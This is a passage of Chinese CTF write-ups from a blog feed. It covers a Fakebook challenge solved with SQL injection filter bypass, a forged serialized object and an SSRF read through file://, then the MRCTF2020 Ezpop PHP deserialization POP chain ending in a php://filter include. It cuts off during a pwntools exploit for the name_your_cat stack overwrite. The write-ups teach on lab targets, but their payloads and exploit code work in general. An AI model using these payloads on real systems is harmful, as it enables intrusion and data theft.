<span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码审计后发现<code>UserInfo</code>类有<code>SSRF</code>漏洞，可以使用<code>file:///var/www/html/flag.php</code>这个<code>payload</code>获取<code>flag</code>（<strong>绝对路径是后面<code>sql</code>注入泄漏出来的</strong>）。但是也会对<code>$this-&gt;blog</code>进行过滤，所以不能在<code>join</code>的时候直接通过<code>blog</code>获得<code>flag</code>。</p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a><code>sql</code>注入</h3><p><strong>这里黑名单中有<code>union select</code>，使用内联注释符<code>/**/</code>绕过，即等价的<code>union/**/select</code>可以绕过。</strong></p>
<p>爆列名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> unIon<span class="comment">/**/</span>select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns where table_schema=<span class="string">&#x27;fakebook&#x27;</span> <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>

<p><code>users</code>表中各字段的位置对应<code>payload</code>中的<code>1,group_concat(column_name),3,4</code>，所以后面我们的<code>payload</code>应该在第四个位置</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102035768.png" alt="QQ_1732072814962" style="zoom:50%;" />

<p>爆<code>data</code>字段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> unIon<span class="comment">/**/</span>select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>得到<code>data</code>字段的内容后，再联系前面的<code>UserInfo</code>类，二者应该是存在序列化与反序列化的关系。</p>
<p><code>data</code>段的内容是将<code>UserInfo</code>类中的对象序列化后的结果，所以我们可以直接修改<code>data</code>段中的<code>blog</code>为<code>file:///var/www/html/flag.php</code>，然后反序列化后<code>UserInfo</code>类中的<code>$this-&gt;blog</code>也就成了<code>file:///var/www/html/flag.php</code>，成功绕过过滤</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102035165.png" alt="image-20241120112823166" style="zoom:80%;" />

<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>构造如下<code>payload</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> unIon<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;jt&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span> <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>

<p>成功注入，查看源码</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102036674.png" alt="image-20241120114623110" style="zoom: 50%;" />

<p>点击<code>url</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102036738.png" alt="QQ_1732074469634" style="zoom:80%;" />

<p>得到<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102034446.png" alt="image-20241120114817983" style="zoom: 67%;" />

<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><code>__wakeup()</code></h4><p>该魔术方法在反序列化的时候自动调用，为反序列化生成的对象做一些初始化操作。</p>
<p><strong>对<code>Show</code>类实例化一个对象赋给<code>$a</code>，将其序列化再反序列化，即可触发。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接反序列化<code>O:4:&quot;Hwaz&quot;:1:&#123;s:2:&quot;jt&quot;;N;&#125;</code>，也会触发魔术方法<code>__wakeup()</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;Hwaz&quot;:1:&#123;s:2:&quot;jt&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h4><p>当类被当作字符串输出或被作为参数等调用时，会自动调用。</p>
<p><strong>在<code>__wakeup()</code>里，<code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code>语句会将<code>$this-&gt;source</code>当做字符串，使<code>$this-&gt;source</code>成为一个类的对象，即可触发。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;                          <span class="comment">#这里$this-&gt;source被当成字符串利用了</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();   <span class="comment">#</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a><code>__get()</code></h4><p>当访问类中的，不可访问的属性，或者是不存在的属性，会自动触发，<code>__get()</code>必须要有参数。</p>
<p><strong><code>__toString()</code>中的<code>$this-&gt;str-&gt;source</code>是突破点。使<code>$this-&gt;str</code>成为一个类的对象，只要这个类中不存在<code>source</code>这个属性，即可触发。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__get()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();   <span class="comment">#$p-&gt;source是一个对象</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();   <span class="comment">#不能是$a-&gt;str = new Test()</span></span><br><span class="line"><span class="variable">$pp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$pp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	要特别注意的一点，虽然有<code>$a = new Show()</code>，但是在<code>$a-&gt;source = new Show()</code>后，后面所有的<code>$a</code>需要用<code>$a-&gt;source</code>代替。</p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><code>__invoke()</code></h4><p>当尝试以调用函数的方式调用一个对象时，方法会被自动调用。</p>
<p><strong>在<code>__get()</code>中，会把<code>function()</code>当作函数调用，而<code>$function = $this-&gt;p</code>，所以只需使<code>$this-&gt;p</code>成为一个对象，即可触发。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__invoke()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();   <span class="comment">#$p-&gt;source是一个对象</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();   <span class="comment">#不能是$a-&gt;str = new Test()</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$pp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$pp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>​	触发<code>__invoke()</code>后，便能调用<code>append()</code>函数，进而调用<code>include()</code>函数触发文件包含漏洞，再使参数<code>$this-&gt;var</code>为<code>php://filter/read=convert.base64-encode/resource=flag.php</code>传参即可拿到<code>flag</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString()&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__get()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="comment">#源码中$var是protected属性，要与源码一致</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$pp</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>url</code>绕过，再对得到的内容进行<code>base64</code>解码，即可得到<code>flag</code>。</p>
<p>参考：</p>
<p><a href="https://www.cnblogs.com/karsa/p/12806945.html">刷题[MRCTF2020]Ezpop</a></p>
<p><a href="https://www.cnblogs.com/WeQi-Blog/p/16071852.html">[MRCTF2020]Ezpop</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>两道有关索引越界的例题</title>
    <url>/2024/02/19/%E4%B8%A4%E9%81%93%E6%9C%89%E5%85%B3%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E7%9A%84%E4%BE%8B%E9%A2%98/</url>
    <content><![CDATA[<h1 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a><code>wustctf2020_name_your_cat</code></h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	检查保护，<code>32</code>位程序，开了<code>NX</code>和<code>canary</code>保护</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011271.png" alt="image-20240219185444801" style="zoom:67%;" />

<p>​	分析源码，程序有后门函数，整体思路就是两次输入分别写进两个地址，这个过程循环<code>5</code>次，然后跳出主函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">NameWhich</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">1</span>] = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name for which?\n&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give your name plz: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%7s&quot;</span>, <span class="number">8</span> * v2[<span class="number">0</span>] + a1);</span><br><span class="line">  <span class="keyword">return</span> v2[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+14h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I bought you five famale cats.Name for them?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = NameWhich((<span class="type">int</span>)v3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You get %d cat!!!!!!\nlemonlemonlemonlemonlemonlemonlemon5555555\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Her name is:%s\n\n&quot;</span>, &amp;v3[<span class="number">8</span> * v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	我们分析漏洞函数<code>NameWhich</code>，<code>v2</code>是一个数组，第一次输入，我们是从<code>v2</code>的起始地址（即<code>v2[0]</code>）开始写，第二次输入被写到<code>8*v2[0]+a1</code>这个地址。我们就可以通过第一次输入的内容控制第二次输入被写的地址距离<code>a1</code>的起始地址的偏移。</p>
<p>​	返回地址距离<code>a1</code>的起始地址的偏移为<code>0x34+4=56</code>个字节，也就是说第一次输入<code>7</code>，第二次输入就可以覆盖返回地址。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011573.png" alt="image-20240219192825555" style="zoom:80%;" />

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./name&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28394</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span 